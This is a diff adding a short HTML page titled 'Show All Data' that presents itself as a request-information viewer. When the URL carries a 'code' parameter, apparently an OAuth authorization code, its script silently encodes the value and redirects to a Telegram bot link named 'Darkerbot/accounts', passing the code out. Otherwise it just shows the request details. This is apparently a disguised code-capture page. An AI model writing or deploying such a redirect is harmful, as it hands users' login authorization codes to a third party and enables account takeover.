@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Show All Data</title>
+</head>
+<body>
+  <h2>Request Information</h2>
+  <pre id="output"></pre>
+
+  <script>
+    function toBase64Url(str) {
+        const bytes = new TextEncoder().encode(str);
+        let binary = '';
+        for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
+        const b64 = btoa(binary);
+        return b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/,'');
+    }
+    const output = document.getElementById('output');
+    const url = window.location.href;
+    const searchParams = new URLSearchParams(window.location.search);
+    const params = Object.fromEntries(searchParams);
+
+    const code = searchParams.get('code');
+    if (code) {
+        const safe = toBase64Url(code);
+        const tgUrl = 'https://t.me/Darkerbot/accounts?startapp=' + safe;
+        window.location.replace(tgUrl);
+    } else {
+      output.textContent = JSON.stringify({
+        full_url: url,
+        method: "GET (static file)",
+        query_parameters: params
+      }, null, 2);
+    }
+  </script>
+</body>
+</html>
